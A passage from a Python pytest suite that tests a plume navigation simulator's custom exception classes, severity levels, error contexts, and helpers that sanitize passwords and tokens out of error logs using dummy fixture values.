        # Verify config_parameter, invalid_value, and valid_options storage
        assert self.config_error.config_parameter == self.test_config_parameter
        assert self.config_error.invalid_value == self.test_invalid_value
        assert self.config_error.valid_options == self.test_valid_options
        
        # Check configuration_context dictionary and validation_errors initialization
        assert isinstance(self.config_error.configuration_context, dict)
        assert isinstance(self.config_error.validation_errors, list)
        
        # Assert recovery suggestion based on valid options
        recovery = self.config_error.recovery_suggestion
        assert self.test_config_parameter in recovery
        assert "render_mode" in recovery
    
    def test_get_valid_options_method(self):
        """Test ConfigurationError.get_valid_options method for providing valid configuration 
        alternatives with descriptions and usage examples."""
        # Call get_valid_options and examine valid configuration alternatives
        valid_options = self.config_error.get_valid_options()
        
        # Assert valid options include parameter descriptions and formats
        assert isinstance(valid_options, dict)
        assert 'render_mode' in valid_options
        
        # Test standard options generation for common configuration parameters
        grid_error = ConfigurationError("Invalid grid size", "grid_size", (-1, -1), None)
        grid_options = grid_error.get_valid_options()
        assert 'grid_size' in grid_options
        assert 'tuple' in grid_options['grid_size'].lower()
        
        # Test with source_location parameter
        source_error = ConfigurationError("Invalid source location", "source_location", (-1, -1), None)
        source_options = source_error.get_valid_options()
        assert 'source_location' in source_options
        assert 'tuple' in source_options['source_location'].lower()
        
        # Test with unknown parameter
        unknown_error = ConfigurationError("Unknown parameter error", "unknown_param", None, None)
        unknown_options = unknown_error.get_valid_options()
        assert isinstance(unknown_options, dict)  # Should return empty dict or default options
    
    def test_add_configuration_context_method(self):
        """Test ConfigurationError.add_configuration_context method for adding configuration context 
        for detailed error analysis and debugging."""
        # Call add_configuration_context with configuration information
        context = {
            'available_backends': ['Agg', 'TkAgg'],
            'current_backend': 'TkAgg',
            'grid_size': (128, 128),
            'environment_type': 'plume_navigation'
        }
        self.config_error.add_configuration_context(context)
        
        # Assert context sanitized and merged into configuration_context
        assert 'available_backends' in self.config_error.configuration_context
        assert 'current_backend' in self.config_error.configuration_context
        assert 'grid_size' in self.config_error.configuration_context
        
        # Test context integration with valid_options updates
        if 'available_backends' in context:
            assert 'backends' in self.config_error.valid_options
            assert self.config_error.valid_options['backends'] == context['available_backends']
        
        # Test enhanced recovery suggestions with context-aware guidance
        if 'grid_size' in context:
            recovery = self.config_error.recovery_suggestion
            assert str(context['grid_size']) in recovery or "grid_size" in recovery.lower()


class TestComponentError:
    """Test suite for ComponentError exception class validating component-level failures, diagnostic 
    information, and failure analysis functionality."""
    
    def setup_method(self):
        """Set up test fixtures for ComponentError class testing."""
        # Initialize ComponentError with component failure scenario
        self.test_component_name = "plume_model"
        self.test_operation_name = "calculate_concentration"
        self.test_underlying_error = ValueError("Invalid coordinates provided")
        self.component_error = ComponentError(
            "Plume model calculation failed",
            self.test_component_name,
            self.test_operation_name,
            self.test_underlying_error
        )
    
    def test_component_error_initialization(self):
        """Test ComponentError initialization with component identification and operation context 
        for failure analysis."""
        # Assert error inherits from PlumeNavSimError with HIGH severity
        assert isinstance(self.component_error, PlumeNavSimError)
        assert self.component_error.severity == ErrorSeverity.HIGH
        
        # Verify component_name, operation_name, and underlying_error storage
        assert self.component_error.component_name == self.test_component_name
        assert self.component_error.operation_name == self.test_operation_name
        assert self.component_error.underlying_error == self.test_underlying_error
        
        # Check component_state dictionary and diagnostic_info initialization
        assert isinstance(self.component_error.component_state, dict)
        assert isinstance(self.component_error.diagnostic_info, list)
        
        # Assert component-specific recovery suggestion
        recovery = self.component_error.recovery_suggestion
        assert "plume model" in recovery.lower()
        assert "reinitialize" in recovery.lower() or "valid" in recovery.lower()
    
    def test_diagnose_failure_method(self):
        """Test ComponentError.diagnose_failure method for performing component-specific failure 
        diagnosis and generating detailed diagnostic reports."""
        # Call diagnose_failure and examine diagnostic report structure
        diagnostic_report = self.component_error.diagnose_failure()
        
        # Assert diagnosis includes component-specific failure analysis
        assert isinstance(diagnostic_report, dict)
        assert diagnostic_report['component_name'] == self.test_component_name
        assert diagnostic_report['operation_name'] == self.test_operation_name
        assert 'failure_timestamp' in diagnostic_report
        
        # Test operation-specific failure pattern recognition
        assert 'operation_analysis' in diagnostic_report
        assert self.test_operation_name in diagnostic_report['operation_analysis']
        
        # Verify underlying error root cause identification
        assert 'root_cause' in diagnostic_report
        root_cause = diagnostic_report['root_cause']
        assert root_cause['error_type'] == 'ValueError'
        assert 'Invalid coordinates' in root_cause['error_message']
        
        # Test diagnosis with component state
        self.component_error.set_component_state({'initialized': True, 'state': 'active'})
        report_with_state = self.component_error.diagnose_failure()
        assert 'component_state_analysis' in report_with_state
    
    def test_set_component_state_method(self):
        """Test ComponentError.set_component_state method for setting component state information 
        for diagnostic analysis."""
        # Call set_component_state with component state information
        state = {
            'initialized': False,
            'memory_usage': 150 * 1024 * 1024,  # 150MB
            'last_operation': 'calculate_concentration',
            'error_count': 3
        }
        self.component_error.set_component_state(state)
        
        # Assert state sanitized and stored in component_state
        assert self.component_error.component_state['initialized'] is False
        assert self.component_error.component_state['memory_usage'] == 150 * 1024 * 1024
        
        # Test state integration with diagnostic_info updates
        assert 'Component not properly initialized' in self.component_error.diagnostic_info
        
        # Test enhanced recovery suggestions based on component state
        recovery = self.component_error.recovery_suggestion
        assert "high memory usage" in recovery.lower() or "reduce" in recovery.lower()


class TestResourceError:
    """Test suite for ResourceError exception class validating resource-related failures, cleanup 
    suggestions, and resource constraint analysis."""
    
    def setup_method(self):
        """Set up test fixtures for ResourceError class testing."""
        # Initialize ResourceError with resource constraint failure scenario
        self.test_resource_type = "memory"
        self.test_current_usage = 100.0  # MB
        self.test_limit_exceeded = 50.0  # MB
        self.resource_error = ResourceError(
            "Memory limit exceeded during plume field generation",
            self.test_resource_type,
            self.test_current_usage,
            self.test_limit_exceeded
        )
    
    def test_resource_error_initialization(self):
        """Test ResourceError initialization with resource type and usage information for constraint 
        analysis."""
        # Assert error inherits from PlumeNavSimError with HIGH severity
        assert isinstance(self.resource_error, PlumeNavSimError)
        assert self.resource_error.severity == ErrorSeverity.HIGH
        
        # Verify resource_type, current_usage, and limit_exceeded storage
        assert self.resource_error.resource_type == self.test_resource_type
        assert self.resource_error.current_usage == self.test_current_usage
        assert self.resource_error.limit_exceeded == self.test_limit_exceeded
        
        # Check resource_details dictionary and cleanup_actions initialization
        assert isinstance(self.resource_error.resource_details, dict)
        assert isinstance(self.resource_error.cleanup_actions, list)
        
        # Assert resource-specific recovery suggestions
        recovery = self.resource_error.recovery_suggestion
        assert "cleanup" in recovery.lower()
        assert len(self.resource_error.cleanup_actions) > 0
    
    def test_suggest_cleanup_actions_method(self):
        """Test ResourceError.suggest_cleanup_actions method for providing specific cleanup actions 
        based on resource type and usage analysis."""
        # Call suggest_cleanup_actions and examine cleanup recommendations
        cleanup_actions = self.resource_error.suggest_cleanup_actions()
        
        # Assert cleanup actions appropriate for resource_type and usage analysis
        assert isinstance(cleanup_actions, list)
        assert len(cleanup_actions) > 0
        
        # Test actions for memory resource type
        if self.test_resource_type == 'memory':
            memory_actions = [action for action in cleanup_actions if 'memory' in action.lower() or 'cache' in action.lower()]
            assert len(memory_actions) > 0
            assert 'clear_cache' in cleanup_actions or 'reduce_grid_size' in cleanup_actions
        
        # Test actions for disk resource type
        disk_error = ResourceError("Disk space exceeded", "disk", 1000.0, 500.0)
        disk_actions = disk_error.suggest_cleanup_actions()
        assert any('cleanup' in action.lower() and ('temp' in action.lower() or 'log' in action.lower()) 
                  for action in disk_actions)
        
        # Test cleanup action prioritization based on severity
        high_usage_error = ResourceError("Critical memory usage", "memory", 95.0, 100.0)
        high_usage_actions = high_usage_error.suggest_cleanup_actions()
        if high_usage_actions:
            assert 'immediate_cleanup_required' in high_usage_actions[0] or high_usage_actions[0].startswith('clear')
    
    def test_set_resource_details_method(self):
        """Test ResourceError.set_resource_details method for setting detailed resource usage 
        information for analysis and cleanup planning."""
        # Call set_resource_details with detailed resource information
        details = {
            'memory_breakdown': {
                'plume_field': 60 * 1024 * 1024,  # 60MB
                'visualization': 20 * 1024 * 1024,  # 20MB
                'other': 20 * 1024 * 1024  # 20MB
            },
            'peak_usage': 120 * 1024 * 1024,
            'gc_collections': 5
        }
        self.resource_error.set_resource_details(details)
        
        # Assert details stored in resource_details dictionary
        assert self.resource_error.resource_details == details
        
        # Test details integration with cleanup_actions updates
        cleanup_actions = self.resource_error.cleanup_actions
        if 'memory_breakdown' in details and details['memory_breakdown']['plume_field'] > 50 * 1024 * 1024:
            assert 'reduce_plume_field_size' in cleanup_actions
        
        # Test optimization recommendations generation
        assert 'optimization_suggestions' in self.resource_error.resource_details
        assert isinstance(self.resource_error.resource_details['optimization_suggestions'], list)


class TestIntegrationError:
    """Test suite for IntegrationError exception class validating external dependency failures, 
    compatibility checking, and version analysis."""
    
    def setup_method(self):
        """Set up test fixtures for IntegrationError class testing."""
        # Initialize IntegrationError with dependency failure scenario
        self.test_dependency_name = "numpy"
        self.test_required_version = ">=2.1.0"
        self.test_current_version = "1.24.0"
        self.integration_error = IntegrationError(
            "NumPy version incompatibility detected",
            self.test_dependency_name,
            self.test_required_version,
            self.test_current_version
        )
    
    def test_integration_error_initialization(self):
        """Test IntegrationError initialization with dependency information and version details for 
        compatibility analysis."""
        # Assert error inherits from PlumeNavSimError with HIGH severity
        assert isinstance(self.integration_error, PlumeNavSimError)
        assert self.integration_error.severity == ErrorSeverity.HIGH
        
        # Verify dependency_name, required_version, and current_version storage
        assert self.integration_error.dependency_name == self.test_dependency_name
        assert self.integration_error.required_version == self.test_required_version
        assert self.integration_error.current_version == self.test_current_version
        
        # Check compatibility_info dictionary and version_mismatch flag
        assert isinstance(self.integration_error.compatibility_info, dict)
        assert self.integration_error.version_mismatch is True  # Should detect version mismatch
        
        # Assert dependency-specific recovery suggestions
        recovery = self.integration_error.recovery_suggestion
        assert "update" in recovery.lower()
        assert self.test_dependency_name in recovery.lower()
    
    def test_check_compatibility_method(self):
        """Test IntegrationError.check_compatibility method for dependency compatibility analysis 
        and upgrade recommendations."""
        # Call check_compatibility and examine compatibility analysis
        compatibility_report = self.integration_error.check_compatibility()
        
        # Assert compatibility report includes version comparison details
        assert isinstance(compatibility_report, dict)
        assert compatibility_report['dependency_name'] == self.test_dependency_name
        assert compatibility_report['required_version'] == self.test_required_version
        assert compatibility_report['current_version'] == self.test_current_version
        assert compatibility_report['version_mismatch'] is True
        
        # Test upgrade recommendations and installation instructions
        if compatibility_report['version_mismatch']:
            assert 'upgrade_recommendation' in compatibility_report
            upgrade_rec = compatibility_report['upgrade_recommendation']
            assert upgrade_rec['action'] == 'upgrade'
            assert self.test_dependency_name in upgrade_rec['command']
            assert self.test_required_version.replace('>=', '') in upgrade_rec['command']
        
        # Test dependency-specific compatibility requirements
        if self.test_dependency_name.lower() in ['numpy', 'matplotlib', 'gymnasium']:
            assert compatibility_report['dependency_type'] == 'critical'
            assert compatibility_report['installation_priority'] == 'high'
    
    def test_set_compatibility_info_method(self):
        """Test IntegrationError.set_compatibility_info method for setting detailed compatibility 
        information for comprehensive error analysis."""
        # Call set_compatibility_info with compatibility information
        info = {
            'version_compatible': False,
            'upgrade_path': ['numpy==1.24.0', 'numpy==2.0.0', 'numpy==2.1.0'],
            'breaking_changes': ['API changes in random module', 'Deprecated functions removed'],
            'migration_guide': 'https://numpy.org/doc/stable/release/2.0.0-notes.html'
        }
        self.integration_error.set_compatibility_info(info)
        
        # Assert info stored in compatibility_info dictionary
        assert 'version_compatible' in self.integration_error.compatibility_info
        assert 'upgrade_path' in self.integration_error.compatibility_info
        assert 'breaking_changes' in self.integration_error.compatibility_info
        
        # Test version_mismatch flag update based on compatibility
        assert self.integration_error.version_mismatch is True  # Should remain True based on version_compatible
        
        # Test upgrade path recommendations in recovery suggestions
        if 'upgrade_path' in info and isinstance(info['upgrade_path'], list):
            recovery = self.integration_error.recovery_suggestion
            # Should include first few steps of upgrade path
            path_elements = info['upgrade_path'][:3]
            for element in path_elements:
                if element in recovery:
                    break
            else:
                # At least mention upgrade path concept
                assert "upgrade path" in recovery.lower() or "follow" in recovery.lower()


class TestErrorSeverity:
    """Test suite for ErrorSeverity enumeration class validating severity levels, escalation logic, 
    and severity-based error handling."""
    
    def setup_method(self):
        """Set up test fixtures for ErrorSeverity enumeration testing."""
        # Initialize severity_levels with all ErrorSeverity values
        self.severity_levels = [ErrorSeverity.LOW, ErrorSeverity.MEDIUM, ErrorSeverity.HIGH, ErrorSeverity.CRITICAL]
    
    def test_severity_levels_definition(self):
        """Test ErrorSeverity enumeration definition ensuring proper integer values and ordering for 
        severity comparison."""
        # Assert ErrorSeverity.LOW equals 1 for minor issues
        assert ErrorSeverity.LOW == 1
        assert ErrorSeverity.LOW.value == 1
        
        # Verify ErrorSeverity.MEDIUM equals 2 for recoverable errors
        assert ErrorSeverity.MEDIUM == 2
        assert ErrorSeverity.MEDIUM.value == 2
        
        # Check ErrorSeverity.HIGH equals 3 for significant errors
        assert ErrorSeverity.HIGH == 3
        assert ErrorSeverity.HIGH.value == 3
        
        # Test ErrorSeverity.CRITICAL equals 4 for system failures
        assert ErrorSeverity.CRITICAL == 4
        assert ErrorSeverity.CRITICAL.value == 4
        
        # Verify severity level ordering and comparison operations
        assert ErrorSeverity.LOW < ErrorSeverity.MEDIUM
        assert ErrorSeverity.MEDIUM < ErrorSeverity.HIGH
        assert ErrorSeverity.HIGH < ErrorSeverity.CRITICAL
        
        # Test severity enumeration maintains consistent integer progression
        values = [level.value for level in self.severity_levels]
        assert values == sorted(values)
        assert values == list(range(1, 5))
    
    def test_get_description_method(self):
        """Test ErrorSeverity.get_description method for human-readable severity level descriptions."""
        # Call get_description for each severity level
        low_desc = ErrorSeverity.LOW.get_description()
        medium_desc = ErrorSeverity.MEDIUM.get_description()
        high_desc = ErrorSeverity.HIGH.get_description()
        critical_desc = ErrorSeverity.CRITICAL.get_description()
        
        # Assert LOW maps to 'Minor issue with suggested improvements'
        assert "minor issue" in low_desc.lower()
        assert "improvements" in low_desc.lower()
        
        # Verify MEDIUM maps to 'Recoverable error with fallback available'
        assert "recoverable" in medium_desc.lower()
        assert "fallback" in medium_desc.lower()
        
        # Check HIGH maps to 'Significant error requiring attention'
        assert "significant" in high_desc.lower()
        assert "attention" in high_desc.lower()
        
        # Test CRITICAL maps to 'Critical system failure requiring immediate action'
        assert "critical" in critical_desc.lower()
        assert "immediate" in critical_desc.lower()
        
        # Assert descriptions are appropriate for logging and user display
        for desc in [low_desc, medium_desc, high_desc, critical_desc]:
            assert len(desc) > 10
            assert desc[0].isupper()  # Should start with capital letter
    
    def test_should_escalate_method(self):
        """Test ErrorSeverity.should_escalate method for error escalation logic based on severity 
        levels."""
        # Test should_escalate returns False for LOW severity
        assert ErrorSeverity.LOW.should_escalate() is False
        
        # Verify should_escalate returns False for MEDIUM severity
        assert ErrorSeverity.MEDIUM.should_escalate() is False
        
        # Check should_escalate returns True for HIGH severity
        assert ErrorSeverity.HIGH.should_escalate() is True
        
        # Test should_escalate returns True for CRITICAL severity
        assert ErrorSeverity.CRITICAL.should_escalate() is True
        
        # Test escalation logic consistency
        non_escalating = [ErrorSeverity.LOW, ErrorSeverity.MEDIUM]
        escalating = [ErrorSeverity.HIGH, ErrorSeverity.CRITICAL]
        
        for level in non_escalating:
            assert level.should_escalate() is False
        
        for level in escalating:
            assert level.should_escalate() is True


class TestErrorContext:
    """Test suite for ErrorContext data class validating structured error context creation, 
    sanitization, and debugging information management."""
    
    def setup_method(self):
        """Set up test fixtures for ErrorContext class testing."""
        # Initialize ErrorContext with component and operation information
        self.error_context = ErrorContext(
            component_name='test_component',
            operation_name='test_operation',
            timestamp=time.time()
        )
        
        # Create test_context_data with various context scenarios
        self.test_context_data = {
            'safe_data': 'public_information',
            'sensitive_data': 'password123',
            'nested_data': {
                'level1': {'level2': 'deep_data'}
            }
        }
    
    def test_error_context_initialization(self):
        """Test ErrorContext initialization with component details, operation context, and timestamp 
        for error tracking."""
        # Assert context initializes with correct component and operation details
        assert self.error_context.component_name == 'test_component'
        assert self.error_context.operation_name == 'test_operation'
        assert isinstance(self.error_context.timestamp, float)
        assert self.error_context.timestamp > 0
        
        # Check optional fields initialization (function_name, line_number, thread_id)
        assert self.error_context.function_name is None
        assert self.error_context.line_number is None
        assert self.error_context.thread_id is None
        
        # Test additional_data dictionary and is_sanitized flag
        assert isinstance(self.error_context.additional_data, dict)
        assert self.error_context.is_sanitized is False
        
        # Test edge cases with empty component names
        edge_context = ErrorContext('', '', time.time())
        assert edge_context.component_name == ''
        assert edge_context.operation_name == ''
    
    def test_add_caller_info_method(self):
        """Test ErrorContext.add_caller_info method for adding caller function and line information 
        using stack inspection."""
        # Call add_caller_info with specified stack depth
        self.error_context.add_caller_info(stack_depth=2)
        
        # Assert function_name and line_number extracted from stack frame
        assert self.error_context.function_name is not None
        assert self.error_context.line_number is not None
        assert isinstance(self.error_context.line_number, int)
        assert self.error_context.line_number > 0
        
        # Test stack inspection with various depth levels
        context2 = ErrorContext('comp2', 'op2', time.time())
        context2.add_caller_info(stack_depth=1)
        
        # Function names may differ based on stack depth
        # At minimum, should not be None after successful call
        assert context2.function_name is not None
        
        # Test graceful error handling if stack inspection fails
        context3 = ErrorContext('comp3', 'op3', time.time())
        context3.add_caller_info(stack_depth=100)  # Invalid depth
        assert context3.function_name == '<unknown>' or context3.function_name is not None
    
    def test_add_system_info_method(self):
        """Test ErrorContext.add_system_info method for adding system and runtime information for 
        debugging context."""
        # Call add_system_info and verify system information addition
        self.error_context.add_system_info()
        
        # Assert thread_id added using threading.current_thread().ident
        assert self.error_context.thread_id is not None
        assert isinstance(self.error_context.thread_id, str)
        
        # Test Python version and platform information inclusion
        assert 'python_version' in self.error_context.additional_data
        assert 'platform' in self.error_context.additional_data
        assert 'thread_name' in self.error_context.additional_data
        
        # Verify system information stored in additional_data dictionary
        python_version = self.error_context.additional_data['python_version']
        platform_info = self.error_context.additional_data['platform']
        
        assert len(python_version) > 0
        assert len(platform_info) > 0
        assert isinstance(python_version, str)
        assert isinstance(platform_info, str)
    
    def test_sanitize_method(self):
        """Test ErrorContext.sanitize method for removing sensitive information while preserving 
        debugging data."""
        # Add sensitive information to context
        self.error_context.additional_data.update({
            'password': 'secret123',
            'token': 'api_token_456',
            'safe_info': 'public_data',
            'timestamp': time.time()
        })
        
        # Call sanitize method
        self.error_context.sanitize()
        
        # Assert sensitive information removed or masked from context
        assert self.error_context.additional_data['password'] == '<sanitized>'
        assert self.error_context.additional_data['token'] == '<sanitized>'
        
        # Verify debugging information like timestamps preserved
        assert self.error_context.additional_data['safe_info'] == 'public_data'
        assert 'timestamp' in self.error_context.additional_data
        
        # Check is_sanitized flag set to True after sanitization
        assert self.error_context.is_sanitized is True
        
        # Test with additional sensitive keys
        context2 = ErrorContext('comp2', 'op2', time.time())
        context2.additional_data.update({
            'custom_secret': 'sensitive_value',
            'normal_data': 'normal_value'
        })
        context2.sanitize(['custom_secret'])
        
        assert context2.additional_data['custom_secret'] == '<sanitized>'
        assert context2.additional_data['normal_data'] == 'normal_value'
    
    def test_to_dict_method(self):
        """Test ErrorContext.to_dict method for converting context to dictionary for serialization 
        and logging."""
        # Add some additional data
        self.error_context.function_name = 'test_function'
        self.error_context.line_number = 42
        self.error_context.add_system_info()
        
        # Call to_dict and examine dictionary structure
        context_dict = self.error_context.to_dict()
        
        # Assert dictionary contains all context fields
        assert isinstance(context_dict, dict)
        assert context_dict['component_name'] == 'test_component'
        assert context_dict['operation_name'] == 'test_operation'
        assert context_dict['timestamp'] == self.error_context.timestamp
        
        # Verify optional fields included when not None
        assert context_dict['function_name'] == 'test_function'
        assert context_dict['line_number'] == 42
        assert context_dict['thread_id'] is not None
        
        # Check additional_data and sanitization status inclusion
        assert 'additional_data' in context_dict
        assert 'is_sanitized' in context_dict
        assert isinstance(context_dict['additional_data'], dict)
        
        # Assert dictionary is JSON-serializable for external use
        json_str = json.dumps(context_dict, default=str)
        assert len(json_str) > 0
        
        # Test with minimal context
        minimal_context = ErrorContext('min_comp', 'min_op', time.time())
        minimal_dict = minimal_context.to_dict()
        
        # Should handle None values gracefully
        assert 'function_name' not in minimal_dict or minimal_dict['function_name'] is None
        assert 'line_number' not in minimal_dict or minimal_dict['line_number'] is None


class TestErrorHandlingFunctions:
    """Test suite for error handling utility functions validating centralized error handling, context 
    sanitization, message formatting, and logging integration."""
    
    def setup_method(self):
        """Set up test fixtures for error handling functions testing."""
        # Initialize test_error_contexts with various error scenarios
        self.test_error_contexts = {
            'validation': {
                'parameter_name': 'grid_size',
                'safe_info': 'public_data'
            },
            'sensitive': {
                'password': 'secret123',
                'token': 'api_token',
                'safe_data': 'normal_info'
            }
        }
        
        # Create test_components list with component names
        self.test_components = TEST_COMPONENT_NAMES.copy()
        
        # Create mock logger for testing
        self.mock_logger = create_mock_logger()
    
    def test_handle_component_error_function(self):
        """Test handle_component_error function for centralized error handling with component-specific 
        recovery strategies and logging integration."""
        # Test with ValidationError
        validation_error = ValidationError("Parameter validation failed", "grid_size", (-1, -1))
        result = handle_component_error(validation_error, "environment", self.test_error_contexts['validation'])
        
        assert result == 'validation_failed'
        
        # Test with RenderingError
        rendering_error = RenderingError("Matplotlib backend failed", "human", "TkAgg")
        result = handle_component_error(rendering_error, "renderer")
        
        assert result == 'fallback_mode'
        
        # Test with high severity errors
        state_error = StateError("Critical state error", "error", "ready", "environment")
        result = handle_component_error(state_error, "environment")
        
        assert result in ['component_error', 'system_error']
        
        # Test with unknown exception type
        unknown_error = RuntimeError("Unexpected runtime error")
        result = handle_component_error(unknown_error, "unknown_component")
        
        assert result == 'system_error'
        
        # Test error parameter validation
        with pytest.raises(TypeError, match="Error parameter must be an Exception instance"):
            handle_component_error("not_an_exception", "component")
        
        with pytest.raises(ValueError, match="Component name must be a non-empty string"):
            handle_component_error(validation_error, "")
    
    def test_sanitize_error_context_function(self):
        """Test sanitize_error_context function for context sanitization preventing sensitive 
        information disclosure while preserving debugging information."""
        # Call sanitize_error_context with contexts containing sensitive information
        sanitized = sanitize_error_context(self.test_error_contexts['sensitive'])
        
        # Assert sensitive values replaced with sanitization placeholder
        assert sanitized['password'] == '<sanitized>'
        assert sanitized['token'] == '<sanitized>'
        
        # Verify debugging information preservation
        assert sanitized['safe_data'] == 'normal_info'
        
        # Test with additional sensitive keys
        context_with_custom = {
            'custom_secret': 'sensitive_value',
            'normal_key': 'normal_value'
        }
        sanitized_custom = sanitize_error_context(context_with_custom, ['custom_secret'])
        
        assert sanitized_custom['custom_secret'] == '<sanitized>'
        assert sanitized_custom['normal_key'] == 'normal_value'
        
        # Test with nested dictionaries
        nested_context = {
            'level1': {
                'password': 'nested_secret',
                'safe': 'nested_safe'
            },
            'normal': 'value'
        }
        sanitized_nested = sanitize_error_context(nested_context)
        
        assert sanitized_nested['level1']['password'] == '<sanitized>'
        assert sanitized_nested['level1']['safe'] == 'nested_safe'
        assert sanitized_nested['normal'] == 'value'
        
        # Test with large strings
        large_context = {
            'large_string': 'x' * 2000,  # Exceeds ERROR_CONTEXT_MAX_LENGTH
            'normal_string': 'normal'
        }
        sanitized_large = sanitize_error_context(large_context)
        
        assert len(sanitized_large['large_string']) <= 1000  # Should be truncated
        assert sanitized_large['large_string'].endswith('...')
        assert sanitized_large['normal_string'] == 'normal'
    
    def test_format_error_details_function(self):
        """Test format_error_details function for comprehensive error detail formatting with context 
        and recovery suggestions."""
        # Create exception for testing
        test_error = ComponentError("Component failure", "test_component", "test_operation")
        test_error.set_recovery_suggestion("Restart the component")
        
        # Call format_error_details with different formatting parameters
        details = format_error_details(
            test_error,
            context={'component': 'test_component', 'safe_info': 'public'},
            recovery_suggestion="Try restarting",
            include_stack_trace=False
        )
        
        # Assert formatted details include exception type, message, and timestamp
        assert "ComponentError" in details
        assert "Component failure" in details
        assert "Error Report" in details
        
        # Test sanitized context inclusion
        assert "safe_info" in details
        assert "public" in details
        
        # Test recovery suggestion inclusion
        assert "Try restarting" in details
        
        # Test with stack trace inclusion
        details_with_trace = format_error_details(
            test_error,
            include_stack_trace=True
        )
        
        # Should include stack trace information
        assert "Stack Trace" in details_with_trace or "Traceback" in details_with_trace
        
        # Test with PlumeNavSimError-specific details
        plume_error = PlumeNavSimError("Base error", severity=ErrorSeverity.HIGH)
        plume_details = format_error_details(plume_error)
        
        assert plume_error.error_id in plume_details
        assert "HIGH" in plume_details
    
    def test_create_error_context_function(self):
        """Test create_error_context function for standardized error context creation with caller 
        information and environment details."""
        # Call create_error_context with various parameter combinations
        context = create_error_context(
            operation_name='test_operation',
            additional_context={'extra': 'data'},
            include_caller_info=True,
            include_system_info=True
        )
        
        # Assert context includes current timestamp and operation_name
        assert isinstance(context, ErrorContext)
        assert context.operation_name == 'test_operation'
        assert context.timestamp > 0
        
        # Test caller information inclusion when include_caller_info is True
        assert context.function_name is not None
        assert context.line_number is not None
        
        # Verify system information inclusion when include_system_info is True
        assert context.thread_id is not None
        assert 'python_version' in context.additional_data
        
        # Check additional_context merging with validation and sanitization
        assert 'extra' in context.additional_data
        assert context.additional_data['extra'] == 'data'
        
        # Test error tracking ID generation
        assert 'error_tracking_id' in context.additional_data
        
        # Test with minimal parameters
        minimal_context = create_error_context()
        assert isinstance(minimal_context, ErrorContext)
        assert minimal_context.operation_name == 'unknown_operation'
        assert minimal_context.component_name == 'unknown'
    
    def test_log_exception_with_recovery_function(self):
        """Test log_exception_with_recovery function for exception logging with detailed context, 
        recovery suggestions, and performance analysis."""
        # Create exception for testing
        test_exception = StateError("State transition failed", "invalid", "ready", "environment")
        
        # Call log_exception_with_recovery with various parameters
        log_exception_with_recovery(
            test_exception,
            self.mock_logger,
            context={'component': 'environment', 'safe_data': 'public'},
            recovery_action='reset_environment',
            include_performance_impact=True
        )
        
        # Verify appropriate logging level based on exception severity
        # StateError has HIGH severity, should use error level
        self.mock_logger.error.assert_called_once()
        
        # Check log message includes comprehensive error context
        call_args = self.mock_logger.error.call_args[0][0]
        assert "State transition failed" in call_args
        assert "reset_environment" in call_args
        
        # Test with performance impact analysis
        assert "Performance Context" in call_args or "timestamp" in call_args
        
        # Test parameter validation
        with pytest.raises(TypeError, match="Exception parameter must be an Exception instance"):
            log_exception_with_recovery("not_exception", self.mock_logger)
        
        with pytest.raises(TypeError, match="Logger parameter must be a logging.Logger instance"):
            log_exception_with_recovery(test_exception, "not_logger")
        
        # Test with different severity levels
        self.mock_logger.reset_mock()
        
        low_error = PlumeNavSimError("Low priority error", severity=ErrorSeverity.LOW)
        log_exception_with_recovery(low_error, self.mock_logger)
        self.mock_logger.info.assert_called_once()
        
        critical_error = PlumeNavSimError("Critical error", severity=ErrorSeverity.CRITICAL)
        log_exception_with_recovery(critical_error, self.mock_logger)
        self.mock_logger.critical.assert_called_once()


class TestExceptionHierarchy:
    """Test suite for exception hierarchy validation ensuring proper inheritance, interface consistency, 
    and exception system design across all custom exceptions."""
    
    def setup_method(self):
        """Set up test fixtures for exception hierarchy testing."""
        # Initialize exception_classes with all custom exception types
        self.exception_classes = [
            ValidationError, StateError, RenderingError, ConfigurationError,
            ComponentError, ResourceError, IntegrationError
        ]
        
        # Create hierarchy_tests for inheritance and interface validation
        self.required_base_methods = ['get_error_details', 'format_for_user', 'log_error', 'set_recovery_suggestion', 'add_context']
    
    def test_exception_inheritance_hierarchy(self):
        """Test all custom exceptions inherit from PlumeNavSimError base class with proper 
        inheritance chain."""
        # Iterate through all exception classes in exception hierarchy
        for exception_class in self.exception_classes:
            # Create instance with minimal parameters
            if exception_class == ValidationError:
                instance = ValidationError("Test validation error", "param", "value")
            elif exception_class == StateError:
                instance = StateError("Test state error", "current", "expected")
            elif exception_class == RenderingError:
                instance = RenderingError("Test rendering error", "mode", "backend")
            elif exception_class == ConfigurationError:
                instance = ConfigurationError("Test config error", "param", "value")
            elif exception_class == ComponentError:
                instance = ComponentError("Test component error", "component")
            elif exception_class == ResourceError:
                instance = ResourceError("Test resource error", "memory", 100.0, 50.0)
            elif exception_class == IntegrationError:
                instance = IntegrationError("Test integration error", "dependency")
            
            # Assert each exception inherits from PlumeNavSimError base class
            assert isinstance(instance, PlumeNavSimError)
            assert issubclass(exception_class, PlumeNavSimError)
            
            # Test exception isinstance relationships with base class
            assert isinstance(instance, Exception)
            assert isinstance(instance, PlumeNavSimError)
            
            # Verify exception inheritance maintains proper method resolution order
            mro = exception_class.__mro__
            assert PlumeNavSimError in mro
            assert Exception in mro
    
    def test_common_interface_implementation(self):
        """Test all exceptions implement common interface methods from base class ensuring consistent 
        error handling capabilities."""
        # Generate test exceptions for interface testing
        test_exceptions = generate_test_exceptions(include_context=True, exception_count=len(self.exception_classes))
        
        for exception in test_exceptions:
            # Test each exception implements required methods
            for method_name in self.required_base_methods:
                assert hasattr(exception, method_name), f"{exception.__class__.__name__} missing method {method_name}"
                method = getattr(exception, method_name)
                assert callable(method), f"{method_name} should be callable"
            
            # Test method functionality
            details = exception.get_error_details()
            assert isinstance(details, dict)
            assert 'error_id' in details
            
            user_message = exception.format_for_user()
            assert isinstance(user_message, str)
            assert len(user_message) > 0
            
            # Test recovery suggestion
            exception.set_recovery_suggestion("Test recovery")
            assert exception.recovery_suggestion == "Test recovery"
            
            # Test context addition
            exception.add_context("test_key", "test_value")
            assert exception.error_details.get("test_key") == "test_value"
    
    def test_exception_severity_consistency(self):
        """Test exception severity assignment consistency ensuring appropriate severity levels for 
        different exception types."""
        # Test ValidationError uses MEDIUM severity for recoverable validation errors
        validation_error = ValidationError("Test validation", "param", "value")
        assert validation_error.severity == ErrorSeverity.MEDIUM
        
        # Verify StateError, ConfigurationError, ComponentError use HIGH severity
        high_severity_classes = [StateError, ConfigurationError, ComponentError, ResourceError, IntegrationError]
        
        for exception_class in high_severity_classes:
            if exception_class == StateError:
                instance = StateError("Test", "current", "expected")
            elif exception_class == ConfigurationError:
